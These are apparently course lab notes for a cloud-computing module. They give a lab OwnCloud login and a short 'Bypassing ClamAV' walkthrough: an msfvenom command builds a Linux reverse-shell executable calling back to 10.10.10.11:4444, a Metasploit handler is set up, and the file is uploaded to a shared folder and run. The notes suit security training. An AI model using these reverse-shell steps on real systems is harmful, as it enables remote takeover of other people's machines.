# 19 - Cloud Computing

## **Module 19 - Cloud Computing**

<details>

<summary>EMPTY</summary>



</details>



### Using Owncloud&#x20;

* Hosted at ubuntu machine http://10.10.10.9/owncloud. admin:qwerty@123
* Create users and share files to users.
* Install Desktop client and share and view files

Bypassing ClamAV

Cloud is currently protected by ClamAV so no malicious file is uploaded.

* `msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.11 LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf` generate a linux based executable&#x20;
* Type `use multi/handler`
* Type `set payload linux/x86/shell/reverse_tcp`
* Type `set LHOST 10.10.10.11`
* Type `set LPORT 4444`
* Type `run`
* Upload payload in shared folder.
* Download using admin, Set permission to `chmod -R 755 exploit.elf`
* Execute exploit `./exploit.elf`

